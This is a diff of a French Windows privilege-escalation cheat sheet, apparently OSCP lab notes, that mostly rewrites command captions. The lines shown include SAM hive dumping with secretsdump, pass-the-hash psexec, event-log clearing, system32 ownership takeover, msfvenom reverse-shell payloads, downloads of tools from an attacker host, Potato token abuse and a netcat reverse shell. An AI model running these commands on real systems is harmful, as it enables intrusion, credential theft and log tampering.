@@ -14,7 +14,7 @@ Auditer les services, jetons et configurations d'un poste Windows.
 **Utilisateur et nom de la machine**
 
 
-<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
+<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Énumération».</p>
 
 ```powershell
 whoami
@@ -298,7 +298,7 @@ Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeIn
 ```
 
 
-```bash
+```powershell
 # Rechercher les fichiers correspondant au filtre
 Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
 
@@ -388,7 +388,7 @@ foreach ($profile in $userProfiles) {
 ### Vérifier les privilèges
 
 
-<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
+<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Vérifier les privilèges».</p>
 
 ```powershell
 whoami /priv
@@ -408,7 +408,7 @@ whoami /priv
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Enable All Tokens ».</p>
+<p class="oscp-command-note">Définir les appels C# utilisés pour gérer les privilèges PowerShell.</p>
 
 ```powershell
 ## Attribution du code : Lee Holmes. Référence : https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
@@ -552,7 +552,7 @@ HKLM\SAM
 
 
 
-<p class="oscp-command-note">Commande Windows : cmd</p>
+<p class="oscp-command-note">Sauvegarder les ruches du Registre pour l'analyse autorisée.</p>
 
 ```powershell
 cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
@@ -564,7 +564,7 @@ cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
 `SAM` · `Impacket` · `secretsdump.py`  
 
 
-<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
+<p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Tableau des privilèges» (ne pas exécuter comme une commande).</p>
 
 ```text
 secretsdump.py -sam SAM -system SYSTEM LOCAL
@@ -577,7 +577,7 @@ secretsdump.py -sam SAM -system SYSTEM LOCAL
 `psexec.py`  
 
 
-<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>
+<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>
 
 ```text
 psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>
@@ -587,7 +587,7 @@ psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>
 
 
 
-<p class="oscp-command-note">Commande Windows : robocopy</p>
+<p class="oscp-command-note">Copier des fichiers avec Robocopy et les options de sauvegarde.</p>
 
 ```powershell
 robocopy /b
@@ -648,7 +648,7 @@ Import-Module .\SeBackupPrivilegeCmdLets.dll
 
 
 
-<p class="oscp-command-note">Commande Windows : Copy-FileSeBackupPrivilege</p>
+<p class="oscp-command-note">Copier le fichier avec les droits SeBackupPrivilege disponibles.</p>
 
 ```powershell
 Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>
@@ -865,7 +865,7 @@ wevtutil cl Security
 ```
 
 
-<p class="oscp-command-note">Commande Windows : wevtutil</p>
+<p class="oscp-command-note">Contrôler la configuration des journaux ou tâches Windows.</p>
 
 ```powershell
 wevtutil sl Security /ms:0
@@ -924,7 +924,7 @@ cmd.exe /c date 01-01-01
 ```
 
 
-<p class="oscp-command-note">Commande Windows : cmd.exe</p>
+<p class="oscp-command-note">CMD : modifier l'heure système (nécessite les privilèges nécessaires ; ne pas exécuter sans raison).</p>
 
 ```powershell
 cmd.exe /c time 00:00
@@ -953,7 +953,7 @@ takeown.exe /f "%windir%\system32"
 
 
 
-<p class="oscp-command-note">Commande Windows : icacls.exe</p>
+<p class="oscp-command-note">Examiner ou modifier les permissions selon «Tableau des privilèges».</p>
 
 ```powershell
 icacls.exe "%windir%\system32" /grant "%username%":F
@@ -1011,7 +1011,7 @@ tzutil /s "Chatham Islands Standard Time"
 `FullPowers.exe` · `SeAssignPrimaryToken` · `SeImpersonate`  
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Démarrer un serveur HTTP local pour fournir des fichiers.</p>
 
 ```bash
 python3 -m http.server 80
@@ -1021,14 +1021,14 @@ python3 -m http.server 80
 ![Initial Privileges of the Service Account.](https://www.emmanuelsolis.com/img/fullpowers_1.png)
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « FullPowers.exe ».</p>
+<p class="oscp-command-note">Windows : télécharger FullPowers.exe avec certutil ou Invoke-WebRequest.</p>
 
 ```powershell
 # CMD
-cerutil.exe -urlcache -split -f http://[kali_ip]/FullPowers.exe
+certutil.exe -urlcache -split -f http://[kali_ip]/FullPowers.exe FullPowers.exe
 
 # PowerShell
-iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
+Invoke-WebRequest -Uri http://[kali_ip]/FullPowers.exe -OutFile FullPowers.exe
 
 ```
 
@@ -1063,7 +1063,7 @@ iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
 `FullPowers.exe`  
 
 
-<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
+<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «FullPowers.exe».</p>
 
 ```powershell
 whoami /priv
@@ -1091,7 +1091,7 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 ```
 
 
-<p class="oscp-command-note">Vérifier les permissions NTFS.</p>
+<p class="oscp-command-note">Examiner ou modifier les permissions selon «Vérifications principales».</p>
 
 ```powershell
 icacls "C:\Path\To\ServiceBinary.exe"
@@ -1109,7 +1109,7 @@ Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object
 
 
 
-<p class="oscp-command-note">Extrait de code C</p>
+<p class="oscp-command-note">Extrait C : exemple technique pour «Vérifications principales» (ce n'est pas une commande de terminal).</p>
 
 ```c
 #include <stdlib.h>
@@ -1149,7 +1149,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -
 `msfvenom`  
 
 
-<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
+<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
 ```powershell
 # N'oubliez pas d'exécuter le serveur HTTP sur votre Kali pour pouvoir apporter le binaire.
@@ -1183,7 +1183,7 @@ sc.exe start <ServiceName>
 ```
 
 
-<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
+<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Vérifications principales».</p>
 
 ```powershell
 # Première vérification des privilèges de redémarrage : SeShutdownPrivilege doit être assigné et activé.
@@ -1207,7 +1207,7 @@ python3 -m http.server 80
 ```
 
 
-<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
+<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
 ```powershell
 iwr -uri http://<attacker-ip>/PowerUp.ps1 -Outfile PowerUp.ps1
@@ -1250,7 +1250,7 @@ Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServi
 ```
 
 
-<p class="oscp-command-note">Vérifier les permissions NTFS.</p>
+<p class="oscp-command-note">Examiner ou modifier les permissions selon «Vérifications complémentaires».</p>
 
 ```powershell
 # Certains services utilisent des fichiers de configuration qui peuvent être détournés de façon similaire aux binaires de service. Exemple : Vérification des autorisations dans un fichier de configuration
@@ -1362,7 +1362,7 @@ $env:path
 
 
 
-<p class="oscp-command-note">Extrait de code C</p>
+<p class="oscp-command-note">Extrait C : exemple technique pour «Chargement de DLL par un service» (ce n'est pas une commande de terminal).</p>
 
 ```c
 #include <windows.h>
@@ -1408,7 +1408,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -
 `msfvenom`  
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Chargement de DLL par un service ».</p>
+<p class="oscp-command-note">Copier ou déplacer les fichiers utilisés dans «Chargement de DLL par un service».</p>
 
 ```powershell
 # Apportez le fichier de votre Kali en utilisant un serveur HTTP
@@ -1491,7 +1491,7 @@ wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""
 
 
 <p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>C:\Program.exe</code></p>
-<p class="oscp-command-note">Vérifier les permissions NTFS.</p>
+<p class="oscp-command-note">Examiner ou modifier les permissions selon «Chemins de services sans guillemets».</p>
 
 ```powershell
 icacls "<PathToDirectory>"
@@ -1499,7 +1499,7 @@ icacls "<PathToDirectory>"
 ```
 
 
-<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
+<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
 ```powershell
 # Télécharger le script PowerUp
@@ -1515,7 +1515,7 @@ Get-UnquotedService
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Chemins de services sans guillemets ».</p>
+<p class="oscp-command-note">Copier ou déplacer les fichiers utilisés dans «Chemins de services sans guillemets».</p>
 
 ```powershell
 # Créer le binaire à partir de Kali, peut être n'importe quel programme, par exemple un shell inverse, ou un programme qui ajoute un nouvel utilisateur.
@@ -1560,7 +1560,7 @@ schtasks /query /fo LIST /v
 ```
 
 
-<p class="oscp-command-note">Vérifier les permissions NTFS.</p>
+<p class="oscp-command-note">Examiner ou modifier les permissions selon «Tâches planifiées».</p>
 
 ```powershell
 icacls "C:\Path\To\ScheduledTaskExecutable.exe"
@@ -1568,7 +1568,7 @@ icacls "C:\Path\To\ScheduledTaskExecutable.exe"
 ```
 
 
-<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
+<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
 ```powershell
 iwr -Uri http://<attacker-ip>/malicious.exe -Outfile malicious.exe
@@ -1621,7 +1621,7 @@ findstr /si password *.ini
 ### Recherche dans les fichiers de configuration
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Lister les fichiers de configuration ou d'identifiants accessibles.</p>
 
 ```bash
 dir /s *pass* == *cred* == *vnc* == *.config*
@@ -1644,9 +1644,9 @@ findstr /spin "password" *.*
 ### Vérifier les fichiers spécifiques
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Check Specific Files ».</p>
+<p class="oscp-command-note">Chemins Windows de fichiers de configuration à rechercher, non exécutables.</p>
 
-```bash
+```text
 c:\sysprep.inf
 c:\sysprep\sysprep.xml
 c:\unattend.xml
@@ -1659,7 +1659,7 @@ c:\unattend.xml
 ### Rechercher des fichiers de mots de passe VNC
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Rechercher des fichiers de mots de passe VNC».</p>
 
 ```bash
 dir c:\*vnc.ini /s /b
@@ -1864,7 +1864,7 @@ Observer les permissions et la configuration de Windows.
 ### Comment vérifier la vulnérabilité
 
 
-<p class="oscp-command-note">Consulter la valeur d&#x27;une clé du Registre.</p>
+<p class="oscp-command-note">Registre : vérifier les politiques AlwaysInstallElevated.</p>
 
 ```powershell
 # Vérifier HKEY_LOCAL_MACHINE pour la politique à l'échelle du système
@@ -1919,18 +1919,13 @@ run
 `msiexec`  
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Exploiting the Vulnerability ».</p>
+<p class="oscp-command-note">Windows : lancer un package MSI avec msiexec ; ne pas traiter le fichier comme une commande Linux.</p>
 
-```bash
-# Si la charge utile est un shell inverse, il pourrait peut-être fonctionner en exécutant simplement le .msi, essayez-le; sinon il suffit d'utiliser ci-dessous les étapes
-./malicious.msi
+**Attention :** l’installation d’un MSI ne garantit aucune élévation de privilèges. Dans le scénario AlwaysInstallElevated, vérifier les deux politiques du Registre avant de conclure.
 
-# Cela installera et exécutera le MSI malveillant avec des permissions de niveau système, vous permettant d'augmenter vos privilèges.
-msiexec /quiet /qn /i malicious.msi
-
-# Les drapeaux /quiet et /qn garantissent que l'installation fonctionne silencieusement sans interaction utilisateur
-# Le drapeau /i spécifie que vous installez le paquet MSI.
-
+```powershell
+# Sur Windows : installation silencieuse d'un fichier MSI de laboratoire autorisé.
+msiexec.exe /i .\malicious.msi /qn
 ```
 
 
@@ -1957,7 +1952,7 @@ msiexec /quiet /qn /i malicious.msi
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Convertir les résultats PEAS en fichiers JSON ou HTML.</p>
 
 ```powershell
 # 1. Télécharger le fichier de la victime à la Kali locale, nous pourrions utiliser les techniques de la section 17.
@@ -1968,7 +1963,7 @@ python3 peas2json.py ./winpeas_output.txt peass.json
 # 3. Convert .json to .html.
 python3 json2html.py peass.json peass.html
 
-# (Optional) We could also convert it to PDF.
+# Facultatif : convertir aussi le rapport au format PDF.
 python3 json2pdf.py peass.json peass.pdf
 
 ```
@@ -2061,14 +2056,14 @@ Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
 ### PowerView
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « PowerView ».</p>
+<p class="oscp-command-note">PowerView : charger le script PowerShell en vérifiant la politique d'exécution.</p>
 
 ```powershell
-.\PowerView.ps1
-# Autre possibilité
-powershell -ExecutionPolicy bypass
-Import-Module ./PowerView.ps1
+# Dans une session PowerShell autorisée, charger PowerView depuis un fichier local.
+Import-Module .\PowerView.ps1
 
+# Vérifier que la fonction attendue est présente.
+Get-Command Get-Domain -ErrorAction SilentlyContinue
 ```
 
 
@@ -2371,7 +2366,7 @@ reg query 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v AlwaysInstallE
 ## Outils d’usurpation de jeton (famille Potato)
 
 
-<p class="oscp-command-note">Afficher le compte utilisateur courant.</p>
+<p class="oscp-command-note">Identifier le compte et les groupes visibles dans «Outils d’usurpation de jeton (famille Potato)».</p>
 
 ```text
 whoami /priv
@@ -2591,7 +2586,7 @@ RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe localgroup Admi
 ### SharpEfsPotato
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « SharpEfsPotato ».</p>
+<p class="oscp-command-note">SharpEfsPotato : exécuter une commande de test et enregistrer le résultat.</p>
 
 ```bash
 SharpEfsPotato.exe -p "C:\Windows\System32\cmd.exe"
@@ -2880,7 +2875,7 @@ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\Windows\System32\wbem\tzres.dll</code></p>
 
 
-<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
+<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
 ```powershell
 iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
@@ -2916,7 +2911,7 @@ systeminfo
 `utilman.exe` · `SeRestoreAbuse.exe`  
 
 
-<p class="oscp-command-note">Changer de répertoire.</p>
+<p class="oscp-command-note">Se placer dans le répertoire utilisé pour «SeRestore».</p>
 
 ```powershell
 cd C:\Windows\system32
@@ -2934,15 +2929,14 @@ ren cmd.exe Utilman.exe
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « SeRestore ».</p>
+<p class="oscp-command-note">Actions distinctes : verrouiller Windows avec Win+L, puis utiliser un client RDP depuis Kali.</p>
 
-```powershell
-# Verrouillez l'ordinateur
-Windows + L
+**Sur Windows :** `Win + L` est un **raccourci clavier** qui verrouille la session, pas une commande PowerShell.
 
-# Connectez-vous via RDP d'une manière qui demande des identifiants dans l'écran Windows
-rdesktop [ip]
+**Sur Kali :** ouvrir ensuite une connexion RDP autorisée.
 
+```bash
+rdesktop <IP_WINDOWS>
 ```
 
 
@@ -2953,18 +2947,14 @@ rdesktop [ip]
 
 
 
-```powershell
-# Once in the Windows Login Screen press
-Windows + U
-
-```
+**Sur l’écran de connexion Windows :** `Win + U` est un **raccourci clavier** qui ouvre les options d’accessibilité. Ce texte ne doit pas être saisi dans un terminal.
 
 
 **Paramètres et repères :**
 `SerestoreAbuse.exe`  
 
 
-<p class="oscp-command-note">Interroger une URL avec PowerShell.</p>
+<p class="oscp-command-note">HTTP : télécharger la ressource dans un fichier local.</p>
 
 ```powershell
 iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe
@@ -2972,16 +2962,24 @@ iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe
 ```
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « SeRestore ».</p>
+<p class="oscp-command-note">Préparer la charge utile sur Kali et appeler SeRestoreAbuse depuis le poste Windows autorisé.</p>
+
+**Sur Kali :** générer le fichier de test dans le laboratoire, si nécessaire.
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT_ECOUTE> -f exe -o payload.exe
+```
+
+**Sur Windows :** après transfert du fichier (voir [Transferts](./transferts.md)), exécuter l’outil uniquement dans le périmètre autorisé.
 
 ```powershell
-# (Option 1) Netcat direct reverse shell
-.\SeRestoreAbuse.exe "C:\temp\nc.exe [attacker_ip] [port] -e powershell.exe"
+.\SeRestoreAbuse.exe "C:\temp\payload.exe"
+```
 
-# (Option 2) Payload reverse shell
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=[kali_ip] LPORT=[port] -f exe -o payload.exe
-.\SeRestoreAbuse.exe C:\temp\payload.exe
+**Autre possibilité Windows, si Netcat est déjà disponible :**
 
+```powershell
+.\SeRestoreAbuse.exe "C:\temp\nc.exe <IP_KALI> <PORT_ECOUTE> -e powershell.exe"
 ```
 
 
